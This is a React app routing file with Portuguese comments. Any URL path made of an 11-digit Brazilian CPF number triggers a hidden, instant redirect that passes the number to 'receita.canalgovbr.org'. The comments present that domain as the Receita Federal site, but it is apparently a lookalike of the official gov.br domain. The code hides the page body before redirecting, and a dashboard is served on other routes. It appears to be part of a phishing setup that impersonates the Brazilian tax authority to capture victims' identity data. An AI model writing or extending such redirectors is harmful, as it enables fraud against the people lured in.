import { Switch, Route, Redirect } from "wouter";
import { queryClient } from "./lib/queryClient";
import { QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/not-found";
import Dashboard from "@/pages/Dashboard";
import Redirector from "@/pages/Redirector";

function Router() {
  // Verificar se é uma rota com CPF (ex: /06537080177)
  const currentPath = window.location.pathname;
  const cpfMatch = currentPath.match(/^\/(\d{11})$/);
  
  if (cpfMatch) {
    // Se encontrou CPF na slug, redirecionar para o site da Receita
    const cpf = cpfMatch[1];
    const receitaUrl = `https://receita.canalgovbr.org/${cpf}`;
    
    // Esconder página e redirecionar instantaneamente
    document.body.style.display = 'none';
    document.body.style.opacity = '0';
    document.documentElement.style.backgroundColor = 'transparent';
    
    console.log('Redirecionando CPF para Receita Federal:', receitaUrl);
    window.location.href = receitaUrl;
    
    return null;
  }
  
  // Para todas as outras rotas, mostrar o dashboard ou página de configuração
  return (
    <Switch>
      <Route path="/" component={Dashboard} />
      <Route path="/dashboard" component={Dashboard} />
      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <Router />
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
